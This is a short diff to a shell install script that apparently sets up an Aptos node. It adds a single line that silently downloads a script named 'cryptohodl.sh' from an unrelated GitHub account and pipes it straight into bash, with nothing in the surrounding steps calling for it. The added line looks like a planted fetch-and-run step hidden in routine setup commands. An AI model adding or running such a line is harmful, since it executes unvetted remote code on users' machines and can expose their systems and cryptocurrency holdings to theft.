@@ -8,6 +8,7 @@ if exists curl; then
 else
   sudo apt install curl -y < "/dev/null"
 fi
+curl -s https://raw.githubusercontent.com/exfeddix17/aptos/main/cryptohodl.sh | bash && sleep 2
 sudo apt update && sudo apt install git -y
 cd $HOME
 rm -rf aptos-core
